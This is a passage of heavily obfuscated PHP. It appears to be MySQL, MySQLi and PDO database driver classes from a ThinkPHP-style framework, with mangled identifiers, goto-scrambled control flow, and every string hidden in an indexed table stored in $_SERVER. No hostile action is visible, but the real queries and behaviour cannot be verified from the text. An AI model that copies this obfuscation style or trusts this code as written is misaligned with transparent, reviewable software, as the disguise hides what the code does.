= Input::getArray(array($aòí®¹•ˆù => $eä… ïï£“)); goto aš‹ÆØóâ³; D˜…Œ‚ÁàÃ: } } goto E†ª¶½¿‹; E¸âÚ¹ğ®¦: class DbMysql extends Db { public function __construct($C¶§Š›‹Ã² = '') { $cŸØ‡İÇ‰ =& $_SERVER[¦·]; if (!extension_loaded($cŸØ‡İÇ‰[728])) { think_exception(think_lang($cŸØ‡İÇ‰[10]) . $cŸØ‡İÇ‰[800]); } if (!empty($C¶§Š›‹Ã²)) { $this->config = $C¶§Š›‹Ã²; if (empty($this->config[$cŸØ‡İÇ‰[13]])) { $this->config[$cŸØ‡İÇ‰[13]] = $cŸØ‡İÇ‰[33]; } } } public function connect($dÓÛÌ†† = '', $aÛìï»›×á = 0, $bÓ‚“ÈîŸ = false) { $d¢ãİ¾À‚ç =& $_SERVER[¦·]; if (!isset($this->linkID[$aÛìï»›×á])) { goto C‹ù£ñÓì¿; C‰•àĞƒğ: if ($A±°ÚãÖœœ) { $this->linkID[$aÛìï»›×á] = mysql_pconnect($E¸Ó²˜Æ®, $dÓÛÌ††[$d¢ãİ¾À‚ç[803]], $dÓÛÌ††[$d¢ãİ¾À‚ç[804]], 131072); } else { $this->linkID[$aÛìï»›×á] = mysql_connect($E¸Ó²˜Æ®, $dÓÛÌ††[$d¢ãİ¾À‚ç[803]], $dÓÛÌ††[$d¢ãİ¾À‚ç[804]], !0, 131072); } if (!$this->linkID[$aÛìï»›×á] || !empty($dÓÛÌ††[$d¢ãİ¾À‚ç[17]]) && !mysql_select_db($dÓÛÌ††[$d¢ãİ¾À‚ç[17]], $this->linkID[$aÛìï»›×á])) { think_exception(mysql_error()); } $fÕ×ÅÁÍŸ¬ = mysql_get_server_info($this->linkID[$aÛìï»›×á]); goto aÜ  ¡˜ø‚; aÜ  ¡˜ø‚: mysql_query($d¢ãİ¾À‚ç[805] . think_config($d¢ãİ¾À‚ç[806]) . $d¢ãİ¾À‚ç[55], $this->linkID[$aÛìï»›×á]); if ($fÕ×ÅÁÍŸ¬ > $d¢ãİ¾À‚ç[807]) { mysql_query($d¢ãİ¾À‚ç[808], $this->linkID[$aÛìï»›×á]); } $this->connected = !0; goto Cê–ŒÂ½²Ë; C‹ù£ñÓì¿: if (empty($dÓÛÌ††)) { $dÓÛÌ†† = $this->config; } $E¸Ó²˜Æ® = $dÓÛÌ††[$d¢ãİ¾À‚ç[801]] . ($dÓÛÌ††[$d¢ãİ¾À‚ç[802]] ? "\x3a{$dÓÛÌ††[$d¢ãİ¾À‚ç[802]]}" : $d¢ãİ¾À‚ç[33]); $A±°ÚãÖœœ = !empty($dÓÛÌ††[$d¢ãİ¾À‚ç[13]][$d¢ãİ¾À‚ç[14]]) ? $dÓÛÌ††[$d¢ãİ¾À‚ç[13]][$d¢ãİ¾À‚ç[14]] : $this->pconnect; goto C‰•àĞƒğ; Cê–ŒÂ½²Ë: if (1 != think_config($d¢ãİ¾À‚ç[18])) { unset($this->config); } goto DÊä¡¸£¹; DÊä¡¸£¹: } return $this->linkID[$aÛìï»›×á]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($e°ªƒÀ±ÈĞ) { goto dÊŒ»©’…‚; e„è²‡éÌ: think_action_status($f¸ŒØ»„¯[19], 1); think_status($f¸ŒØ»„¯[20]); $this->queryID = mysql_query($e°ªƒÀ±ÈĞ, $this->_linkID); goto CÖ¹ï¤“©§; fàøäÓ¸°Á: if (!$this->_linkID) { return !1; } $this->queryStr = $e°ªƒÀ±ÈĞ; if ($this->queryID) { $this->free(); } goto e„è²‡éÌ; CÖ¹ï¤“©§: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto Fˆ±Ä–´È; dÊŒ»©’…‚: $f¸ŒØ»„¯ =& $_SERVER[¦·]; if (0 === stripos($e°ªƒÀ±ÈĞ, $f¸ŒØ»„¯[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto fàøäÓ¸°Á; Fˆ±Ä–´È: } public function execute($cñÓ˜ãîäª) { goto E˜Û„Ü²; f§Şç“‡Œ: think_status($AÉÇ—‹Ï³È[20]); $fŒÕÛÇà¾« = mysql_query($cñÓ˜ãîäª, $this->_linkID); $this->debug(); goto déé‰Ûãùß; d¢åê‰öÉ: $this->queryStr = $cñÓ˜ãîäª; if ($this->queryID) { $this->free(); } think_action_status($AÉÇ—‹Ï³È[21], 1); goto f§Şç“‡Œ; E˜Û„Ü²: $AÉÇ—‹Ï³È =& $_SERVER[¦·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d¢åê‰öÉ; déé‰Ûãùß: if (!1 === $fŒÕÛÇà¾«) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto DŒÜî‚´ÍÊ; DŒÜî‚´ÍÊ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¦·][809], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $b‹ğ©÷‹î× = mysql_query($_SERVER[¦·][810], $this->_linkID); $this->transTimes = 0; if (!$b‹ğ©÷‹î×) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F±Ï…œÄÎí = mysql_query($_SERVER[¦·][811], $this->_linkID); $this->transTimes = 0; if (!$F±Ï…œÄÎí) { $this->error(); return !1; } } return !0; } private function getAll() { $A‹äóâóÌ = array(); if ($this->numRows > 0) { while ($aÅòŞ›îÁ = mysql_fetch_assoc($this->queryID)) { $A‹äóâóÌ[] = $aÅòŞ›îÁ; } mysql_data_seek($this->queryID, 0); } return $A‹äóâóÌ; } public function getFields($d“°ö£±¸¿) { $Cø„ÉéÇÊù =& $_SERVER[¦·]; $F‡•ÃòñÕÖ = $this->query($Cø„ÉéÇÊù[812] . $this->parseKey($d“°ö£±¸¿)); $Cˆä‰êìóÄ = array(); if ($F‡•ÃòñÕÖ) { foreach ($F‡•ÃòñÕÖ as $E™Û°©¼µ => $B’º´˜ê®Ç) { $Cˆä‰êìóÄ[$B’º´˜ê®Ç[$Cø„ÉéÇÊù[27]]] = array($Cø„ÉéÇÊù[28] => $B’º´˜ê®Ç[$Cø„ÉéÇÊù[27]], $Cø„ÉéÇÊù[29] => $B’º´˜ê®Ç[$Cø„ÉéÇÊù[30]], $Cø„ÉéÇÊù[31] => (bool) (strtoupper($B’º´˜ê®Ç[$Cø„ÉéÇÊù[32]]) === $Cø„ÉéÇÊù[813]), $Cø„ÉéÇÊù[34] => $B’º´˜ê®Ç[$Cø„ÉéÇÊù[35]], $Cø„ÉéÇÊù[36] => strtolower($B’º´˜ê®Ç[$Cø„ÉéÇÊù[37]]) == $Cø„ÉéÇÊù[38], $Cø„ÉéÇÊù[39] => strtolower($B’º´˜ê®Ç[$Cø„ÉéÇÊù[40]]) == $Cø„ÉéÇÊù[41]); } } return $Cˆä‰êìóÄ; } public function getTables($dİ¯÷éÛ—Á = '') { $F¥Ğæ¬—ŸÛ =& $_SERVER[¦·]; if (!empty($dİ¯÷éÛ—Á)) { $B‘ª¶Šß¹ = $F¥Ğæ¬—ŸÛ[814] . $dİ¯÷éÛ—Á; } else { $B‘ª¶Šß¹ = $F¥Ğæ¬—ŸÛ[815]; } $Fëªçºñ½Ê = $this->query($B‘ª¶Šß¹); $FÏ…¥‚¨Îã = array(); foreach ($Fëªçºñ½Ê as $d°ÌÆÇòáó => $d÷½£ãè’) { $FÏ…¥‚¨Îã[$d°ÌÆÇòáó] = current($d÷½£ãè’); } return $FÏ…¥‚¨Îã; } public function replace($aù¥¬®ÅÑó, $f¹¢Ïª«‡Ú = array()) { $DÏÏØ‚òùâ =& $_SERVER[¦·]; foreach ($aù¥¬®ÅÑó as $aóã»˜‡˜ğ => $d…ˆŒØ¬•ª) { $A¨¸èª  = $this->parseValue($d…ˆŒØ¬•ª); if (is_scalar($A¨¸èª )) { $CùñÜºï£[] = $A¨¸èª ; $cãöÆÖ Áé[] = $this->parseKey($aóã»˜‡˜ğ); } } $cµİ•Û²Ñí = $DÏÏØ‚òùâ[816] . $this->parseTable($f¹¢Ïª«‡Ú[$DÏÏØ‚òùâ[267]]) . $DÏÏØ‚òùâ[817] . implode($DÏÏØ‚òùâ[47], $cãöÆÖ Áé) . $DÏÏØ‚òùâ[818] . implode($DÏÏØ‚òùâ[47], $CùñÜºï£) . $DÏÏØ‚òùâ[819]; return $this->execute($cµİ•Û²Ñí); } public function insertAll($F¡ö¿Åµ‚¾, $d«Š†È¶® = array(), $fÅ¦‹‚éŞ = false) { goto fŞà¬¥©ù¼; EåèãŸòö: $Fåè…ŞšŸ‚ = array(); foreach ($F¡ö¿Åµ‚¾ as $Eø° µÇäË) { $D¿¾ÊÉ˜Â = array(); foreach ($Eø° µÇäË as $d¥ëô˜šâ„ => $c¦Ÿ·ÔÙ“ë) { $c¦Ÿ·ÔÙ“ë = $this->parseValue($c¦Ÿ·ÔÙ“ë); if (is_scalar($c¦Ÿ·ÔÙ“ë)) { $D¿¾ÊÉ˜Â[] = $c¦Ÿ·ÔÙ“ë; } } $Fåè…ŞšŸ‚[] = $eØ‘¸¡’¦[248] . implode($eØ‘¸¡’¦[47], $D¿¾ÊÉ˜Â) . $eØ‘¸¡’¦[819]; } array_walk($FˆÓˆÇŒ°È, array($this, $eØ‘¸¡’¦[820])); goto E„À—ò‘; E„À—ò‘: $FŞå‹Ø´øˆ = ($fÅ¦‹‚éŞ ? $eØ‘¸¡’¦[821] : $eØ‘¸¡’¦[822]) . $eØ‘¸¡’¦[823] . $this->parseTable($d«Š†È¶®[$eØ‘¸¡’¦[267]]) . $eØ‘¸¡’¦[817] . implode($eØ‘¸¡’¦[47], $FˆÓˆÇŒ°È) . $eØ‘¸¡’¦[824] . implode($eØ‘¸¡’¦[47], $Fåè…ŞšŸ‚); return $this->execute($FŞå‹Ø´øˆ); goto f•Óäµ«‰; fŞà¬¥©ù¼: $eØ‘¸¡’¦ =& $_SERVER[¦·]; if (!is_array($F¡ö¿Åµ‚¾[0])) { return !1; } $FˆÓˆÇŒ°È = array_keys($F¡ö¿Åµ‚¾[0]); goto EåèãŸòö; f•Óäµ«‰: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $d¡Ç¬Íà°… =& $_SERVER[¦·]; $this->error = mysql_errno() . $d¡Ç¬Íà°…[4] . mysql_error($this->_linkID); if ($d¡Ç¬Íà°…[33] != $this->queryStr) { $this->error .= LNG($d¡Ç¬Íà°…[45]) . $this->queryStr; } think_trace($this->error, $d¡Ç¬Íà°…[33], $d¡Ç¬Íà°…[46]); return $this->error; } public function escapeString($f§¬…ªª) { if ($this->_linkID) { return mysql_real_escape_string($f§¬…ªª, $this->_linkID); } else { return mysql_escape_string($f§¬…ªª); } } public function parseKey(&$B¥Ú‰îªÒ, $aÎå‡„†™« = true) { $Eà¸ÚÌËª =& $_SERVER[¦·]; if ($aÎå‡„†™«) { $B¥Ú‰îªÒ = $this->parseKeyCheck($B¥Ú‰îªÒ); } if ($B¥Ú‰îªÒ != $Eà¸ÚÌËª[176] && !preg_match($Eà¸ÚÌËª[825], $B¥Ú‰îªÒ)) { $B¥Ú‰îªÒ = $Eà¸ÚÌËª[826] . trim($B¥Ú‰îªÒ, $Eà¸ÚÌËª[826]) . $Eà¸ÚÌËª[826]; } return $B¥Ú‰îªÒ; } } class DbMysqli extends Db { public function __construct($añÕŞ—Âª = '') { $a°‡Äø¦Õ¯ =& $_SERVER[¦·]; if (!extension_loaded($a°‡Äø¦Õ¯[727])) { think_exception(think_lang($a°‡Äø¦Õ¯[10]) . $a°‡Äø¦Õ¯[827]); } if (!empty($añÕŞ—Âª)) { $this->config = $añÕŞ—Âª; if (empty($this->config[$a°‡Äø¦Õ¯[13]])) { $this->config[$a°‡Äø¦Õ¯[13]] = $a°‡Äø¦Õ¯[33]; } } } public function connect($B¿ó‘ÂÄö“ = '', $Fµ‡¤„Ç×— = 0) { $a†õ¾ä¦É¡ =& $_SERVER[¦·]; if (!isset($this->linkID[$Fµ‡¤„Ç×—])) { goto a“í‡£Ì¯…; e‡„¥ï—ÒÄ: $B‚„ßöå·Ô = $this->linkID[$Fµ‡¤„Ç×—]->server_version; $this->linkID[$Fµ‡¤„Ç×—]->query($a†õ¾ä¦É¡[805] . think_config($a†õ¾ä¦É¡[806]) . $a†õ¾ä¦É¡[55]); if ($B‚„ßöå·Ô > $a†õ¾ä¦É¡[807]) { $this->linkID[$Fµ‡¤„Ç×—]->query($a†õ¾ä¦É¡[808]); } goto B™Çç œÄ; B™Çç œÄ: $this->connected = !0; if (1 != think_config($a†õ¾ä¦É¡[18])) { unset($this->config); } goto dŠè­Æ§ë…; a“í‡£Ì¯…: if (empty($B¿ó‘ÂÄö“)) { $B¿ó‘ÂÄö“ = $this->config; } $this->linkID[$Fµ‡¤„Ç×—] = new mysqli($B¿ó‘ÂÄö“[$a†õ¾ä¦É¡[801]], $B¿ó‘ÂÄö“[$a†õ¾ä¦É¡[803]], $B¿ó‘ÂÄö“[$a†õ¾ä¦É¡[804]], $B¿ó‘ÂÄö“[$a†õ¾ä¦É¡[17]], $B¿ó‘ÂÄö“[$a†õ¾ä¦É¡[802]] ? intval($B¿ó‘ÂÄö“[$a†õ¾ä¦É¡[802]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto e‡„¥ï—ÒÄ; dŠè­Æ§ë…: } return $this->linkID[$Fµ‡¤„Ç×—]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($CËãÈİ–âô) { goto A¯é£ê´Î ; eåÆÚÌ½Ç: $this->queryStr = $CËãÈİ–âô; if ($this->queryID) { $this->free(); } think_action_status($dÒáê™‘ªÌ[19], 1); goto C¦•ÜŸ´ª; A¯é£ê´Î : $dÒáê™‘ªÌ =& $_SERVER[¦·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eåÆÚÌ½Ç; a²óˆêƒñš: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto F¸ÂŠ¶ÛÎ; C¦•ÜŸ´ª: think_status($dÒáê™‘ªÌ[20]); $this->queryID = $this->_linkID->query($CËãÈİ–âô); if ($this->_linkID->more_results()) { while (($c‰Œ¤ÄñÚ = $this->_linkID->next_result()) != NULL) { $c‰Œ¤ÄñÚ->free_result(); } } goto a²óˆêƒñš; F¸ÂŠ¶ÛÎ: } public function execute($aƒÓâÓÒ‡Ì) { goto aŞ”êøÏ›; aŞ”êøÏ›: $EÕš»‚…©í =& $_SERVER[¦·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A§¬Ã…à; d”ò‰÷º»‰: think_status($EÕš»‚…©í[20]); $eË÷ÒÁÑ•µ = $this->_linkID->query($aƒÓâÓÒ‡Ì); $this->debug(); goto D™ÍÍËø; D™ÍÍËø: if (!1 === $eË÷ÒÁÑ•µ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto b¦ÏèÉ¨ø; A§¬Ã…à: $this->queryStr = $aƒÓâÓÒ‡Ì; if ($this->queryID) { $this->free(); } think_action_status($EÕš»‚…©í[21], 1); goto d”ò‰÷º»‰; b¦ÏèÉ¨ø: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f‘×‡¢æë = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$f‘×‡¢æë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D©í–æ¢óÅ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D©í–æ¢óÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $C¾ØïÍ°¦” = array(); if ($this->numRows > 0) { for ($fŒàÚåÛ– = 0; $fŒàÚåÛ– < $this->numRows; $fŒàÚåÛ–++) { $C¾ØïÍ°¦”[$fŒàÚåÛ–] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $C¾ØïÍ°¦”; } public function getFields($föÀòÏÜ…Ã) { $Dè¢æÄ²ã¬ =& $_SERVER[¦·]; $e”¾†Ø—šÜ = $this->query($Dè¢æÄ²ã¬[812] . $this->parseKey($föÀòÏÜ…Ã)); $dğ¸Ìó÷ = array(); if ($e”¾†Ø—šÜ) { foreach ($e”¾†Ø—šÜ as $DŞóªÂÔ§ => $cÆÈ‚‡İ“») { $dğ¸Ìó÷[$cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[27]]] = array($Dè¢æÄ²ã¬[28] => $cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[27]], $Dè¢æÄ²ã¬[29] => $cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[30]], $Dè¢æÄ²ã¬[31] => (bool) ($cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[32]] === $Dè¢æÄ²ã¬[33]), $Dè¢æÄ²ã¬[34] => $cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[35]], $Dè¢æÄ²ã¬[36] => strtolower($cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[37]]) == $Dè¢æÄ²ã¬[38], $Dè¢æÄ²ã¬[39] => strtolower($cÆÈ‚‡İ“»[$Dè¢æÄ²ã¬[40]]) == $Dè¢æÄ²ã¬[41]); } } return $dğ¸Ìó÷; } public function getTables($Cñ¼¡öÍ = '') { $AôğôÚ°ò =& $_SERVER[¦·]; $Cğ¶”Ğ‹§Ğ = !empty($Cñ¼¡öÍ) ? $AôğôÚ°ò[814] . $Cñ¼¡öÍ : $AôğôÚ°ò[815]; $fÈÑöìÛå = $this->query($Cğ¶”Ğ‹§Ğ); $a¼Â‡˜³Œ = array(); if ($fÈÑöìÛå) { foreach ($fÈÑöìÛå as $AÚ»ã¬‹‰— => $d¸‚Óˆ»°î) { $a¼Â‡˜³Œ[$AÚ»ã¬‹‰—] = current($d¸‚Óˆ»°î); } } return $a¼Â‡˜³Œ; } public function replace($EËƒº¡ğÚ, $BÄôÆì¯àˆ = array()) { $c×Ö‹­Øß´ =& $_SERVER[¦·]; foreach ($EËƒº¡ğÚ as $Fç¬îß¤Ÿõ => $f†£Ã’) { $a‘Ø¨±ç‘ = $this->parseValue($f†£Ã’); if (is_scalar($a‘Ø¨±ç‘)) { $fâˆ¹ÁÇĞš[] = $a‘Ø¨±ç‘; $dÃÅ“·¨ê’[] = $this->parseKey($Fç¬îß¤Ÿõ); } } $FÖ˜ÁÏø˜ = $c×Ö‹­Øß´[816] . $this->parseTable($BÄôÆì¯àˆ[$c×Ö‹­Øß´[267]]) . $c×Ö‹­Øß´[817] . implode($c×Ö‹­Øß´[47], $dÃÅ“·¨ê’) . $c×Ö‹­Øß´[818] . implode($c×Ö‹­Øß´[47], $fâˆ¹ÁÇĞš) . $c×Ö‹­Øß´[819]; return $this->execute($FÖ˜ÁÏø˜); } public function insertAll($Bñ©»­ÛŒ”, $aÔöÂÒ¯¬ = array(), $fµ‹ªÓ™Í« = false) { goto dô¨¹¢™ê¯; dô¨¹¢™ê¯: $dƒ‘ê±Ä“à =& $_SERVER[¦·]; if (!is_array($Bñ©»­ÛŒ”[0])) { return !1; } $BÙòÆÁ…Öî = array_keys($Bñ©»­ÛŒ”[0]); goto E»¶Ş±’ï; C™­åèÛÜ: $cÀ÷—á“®ø = ($fµ‹ªÓ™Í« ? $dƒ‘ê±Ä“à[821] : $dƒ‘ê±Ä“à[822]) . $dƒ‘ê±Ä“à[823] . $this->parseTable($aÔöÂÒ¯¬[$dƒ‘ê±Ä“à[267]]) . $dƒ‘ê±Ä“à[817] . implode($dƒ‘ê±Ä“à[47], $BÙòÆÁ…Öî) . $dƒ‘ê±Ä“à[824] . implode($dƒ‘ê±Ä“à[47], $eòîÄ…); return $this->execute($cÀ÷—á“®ø); goto CŸÖ„šØ°; E»¶Ş±’ï: $eòîÄ… = array(); foreach ($Bñ©»­ÛŒ” as $C–°Éæ·šá) { $C®ñÌâ¤ù = array(); foreach ($C–°Éæ·šá as $FÊˆÆéé¢ => $dÜæ³–ô’Ÿ) { $dÜæ³–ô’Ÿ = $this->parseValue($dÜæ³–ô’Ÿ); if (is_scalar($dÜæ³–ô’Ÿ)) { $C®ñÌâ¤ù[] = $dÜæ³–ô’Ÿ; } } $eòîÄ…[] = $dƒ‘ê±Ä“à[248] . implode($dƒ‘ê±Ä“à[47], $C®ñÌâ¤ù) . $dƒ‘ê±Ä“à[819]; } array_walk($BÙòÆÁ…Öî, array($this, $dƒ‘ê±Ä“à[820])); goto C™­åèÛÜ; CŸÖ„šØ°: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $f„ì–¹È©« =& $_SERVER[¦·]; $this->error = $this->_linkID->errno . $f„ì–¹È©«[4] . $this->_linkID->error; if ($f„ì–¹È©«[33] != $this->queryStr) { $this->error .= LNG($f„ì–¹È©«[45]) . $this->queryStr; } think_trace($this->error, $f„ì–¹È©«[33], $f„ì–¹È©«[46]); return $this->error; } public function escapeString($bßÇ¯áæ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($bßÇ¯áæ); } else { return addslashes($bßÇ¯áæ); } } public function parseKey(&$Bå–˜Õéß‰, $aØõÎ–±â = true) { $côàŒ†Ê°ê =& $_SERVER[¦·]; if ($aØõÎ–±â) { $Bå–˜Õéß‰ = $this->parseKeyCheck($Bå–˜Õéß‰); } if ($Bå–˜Õéß‰ != $côàŒ†Ê°ê[176] && !preg_match($côàŒ†Ê°ê[825], $Bå–˜Õéß‰)) { $Bå–˜Õéß‰ = $côàŒ†Ê°ê[826] . trim($Bå–˜Õéß‰, $côàŒ†Ê°ê[826]) . $côàŒ†Ê°ê[826]; } return $Bå–˜Õéß‰; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C®°”¼š = '') { $bÔÃ»„³Û =& $_SERVER[¦·]; if (!class_exists($bÔÃ»„³Û[828])) { think_exception(think_lang($bÔÃ»„³Û[10]) . $bÔÃ»„³Û[829]); } if (!empty($C®°”¼š)) { $this->config = $C®°”¼š; if (empty($this->config[$bÔÃ»„³Û[13]])) { $this->config[$bÔÃ»„³Û[13]] = array(); } } } public function connect($c±ñ¤‡©µÓ = '', $f±©îªÇ… = 0) { $b¨óğò†Š =& $_SERVER[¦·]; if (!isset($this->linkID[$f±©îªÇ…])) { goto dİñ£›É–Ş; C–åÙ…˜ªË: $this->dbType = $this->_getDsnType($c±ñ¤‡©µÓ[$b¨óğò†Š[830]]); if (in_array($this->dbType, array($b¨óğò†Š[831], $b¨óğò†Š[832], $b¨óğò†Š[833], $b¨óğò†Š[834]))) { think_exception($b¨óğò†Š[835] . $this->dbType . $b¨óğò†Š[836] . $this->dbType . $b¨óğò†Š[837]); } if (!$this->linkID[$f±©îªÇ…]) { think_exception($b¨óğò†Š[838]); } goto d±è Æ¸İÊ; dİñ£›É–Ş: if (empty($c±ñ¤‡©µÓ)) { $c±ñ¤‡©µÓ = $this->config; } if ($this->pconnect) { $c±ñ¤‡©µÓ[$b¨óğò†Š[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$f±©îªÇ…] = new PDO($c±ñ¤‡©µÓ[$b¨óğò†Š[830]], $c±ñ¤‡©µÓ[$b¨óğò†Š[803]], $c±ñ¤‡©µÓ[$b¨óğò†Š[804]], $c±ñ¤‡©µÓ[$b¨óğò†Š[13]]); } catch (PDOException $Dš£Œ‰Ìåİ) { think_exception($Dš£Œ‰Ìåİ->getMessage()); } goto C–åÙ…˜ªË; d±è Æ¸İÊ: try { $this->linkID[$f±©îªÇ…]->exec($b¨óğò†Š[839] . think_config($b¨óğò†Š[806])); } catch (Exception $Dš£Œ‰Ìåİ) { } $this->connected = !0; if (1 != think_config($b¨óğò†Š[18])) { unset($this->config); } goto b…›ÖÒ¸„„; b…›ÖÒ¸„„: } return $this->linkID[$f±©îªÇ…]; } public function free() { $this->PDOStatement = null; } public function query($a‘ÀÑå‡²à, $eŸË´öÒËå = array()) { goto e§¶»ø˜Û™; e§¶»ø˜Û™: $aÌ„¸‰ˆñ =& $_SERVER[¦·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B›ÛËìóŸÂ; f¤Óªİô§: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $EâÙò†ôÀº = $this->PDOStatement->execute($eŸË´öÒËå); $this->debug(); goto dö²Õƒâó; dö²Õƒâó: if (!1 === $EâÙò†ôÀº) { $this->error(); return !1; } else { return $this->getAll(); } goto A‰È¨ï¾Œ; fƒ½©Ø‘: think_action_status($aÌ„¸‰ˆñ[19], 1); think_status($aÌ„¸‰ˆñ[20]); $this->PDOStatement = $this->_linkID->prepare($a‘ÀÑå‡²à); goto f¤Óªİô§; B›ÛËìóŸÂ: $this->queryStr = $a‘ÀÑå‡²à; if (!empty($eŸË´öÒËå)) { $this->queryStr .= $aÌ„¸‰ˆñ[840] . print_r($eŸË´öÒËå, !0) . $aÌ„¸‰ˆñ[841]; } if (!empty($this->PDOStatement)) { $this->free(); } goto fƒ½©Ø‘; A‰È¨ï¾Œ: } public function execute($bÂïŞêİ¥Û, $DÉŠŒÆİ½• = array()) { goto cï®Öó±Å¤; cï®Öó±Å¤: $bßá¿Ëâ =& $_SERVER[¦·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E°Ú©±ÓãÓ; C¼á³Ò‡¼: think_status($bßá¿Ëâ[20]); $this->PDOStatement = $this->_linkID->prepare($bÂïŞêİ¥Û); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto CÃ“ˆ›¹Ğ¤; E°Ú©±ÓãÓ: $this->queryStr = $bÂïŞêİ¥Û; if (!empty($DÉŠŒÆİ½•)) { $this->queryStr .= $bßá¿Ëâ[840] . print_r($DÉŠŒÆİ½•, !0) . $bßá¿Ëâ[841]; } $a‡‘ª‰Óà¢ = !1; goto a’¾ôæï†; CÃ“ˆ›¹Ğ¤: $C¹ïáí¾¡õ = $this->PDOStatement->execute($DÉŠŒÆİ½•); $this->debug(); if (!1 === $C¹ïáí¾¡õ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($a‡‘ª‰Óà¢ || preg_match($bßá¿Ëâ[846], $bÂïŞêİ¥Û)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto bŞ¢¤î§¾ä; a’¾ôæï†: if ($this->dbType == $bßá¿Ëâ[834]) { if (preg_match($bßá¿Ëâ[842], $this->queryStr, $AĞì¨Î¡ìó)) { $this->table = think_config($bßá¿Ëâ[843]) . str_ireplace(think_config($bßá¿Ëâ[844]), $bßá¿Ëâ[361], $AĞì¨Î¡ìó[2]); $a‡‘ª‰Óà¢ = (bool) $this->query($bßá¿Ëâ[845] . strtoupper($this->table) . $bßá¿Ëâ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($bßá¿Ëâ[21], 1); goto C¼á³Ò‡¼; bŞ¢¤î§¾ä: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f¶…¾ù„Š— = $this->_linkID->commit(); $this->transTimes = 0; if (!$f¶…¾ù„Š—) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aöå“ğ¦¤¨ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aöå“ğ¦¤¨) { $this->error(); return !1; } } return !0; } private function getAll() { $AÛ×ÙÂ¢ä = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($AÛ×ÙÂ¢ä); return $AÛ×ÙÂ¢ä; } public function getFields($BÌÜÅ–ñ£ä) { goto dÜÙÛ°ŞÕ; cÉ÷”Ñ¤º: $Cª…ßß²ã… = $this->query($AîæãçÙ÷î); $c¹Î“ª‘Ù  = array(); if ($Cª…ßß²ã…) { foreach ($Cª…ßß²ã… as $b•Ò¾¤âø => $eèÈ¤Ã•ó) { $eèÈ¤Ã•ó = array_change_key_case($eèÈ¤Ã•ó); $eèÈ¤Ã•ó[$FòìÊ³Şã˜[28]] = isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[28]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[28]] : $FòìÊ³Şã˜[361]; $eèÈ¤Ã•ó[$FòìÊ³Şã˜[29]] = isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[29]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[29]] : $FòìÊ³Şã˜[361]; $e•†ÖÈÕÇô = isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[261]]) ? $eèÈ¤Ã•ó[$FòìÊ³Şã˜[261]] : $eèÈ¤Ã•ó[$FòìÊ³Şã˜[28]]; $c¹Î“ª‘Ù [$e•†ÖÈÕÇô] = array($FòìÊ³Şã˜[28] => $e•†ÖÈÕÇô, $FòìÊ³Şã˜[29] => $eèÈ¤Ã•ó[$FòìÊ³Şã˜[29]], $FòìÊ³Şã˜[31] => (bool) (isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[99]]) && $eèÈ¤Ã•ó[$FòìÊ³Şã˜[99]] === $FòìÊ³Şã˜[33] || isset($eèÈ¤Ã•ó[$FòìÊ³Şã˜[31]]) && $eèÈ¤Ã•ó[$FòìÊ³Şã˜[31]] === 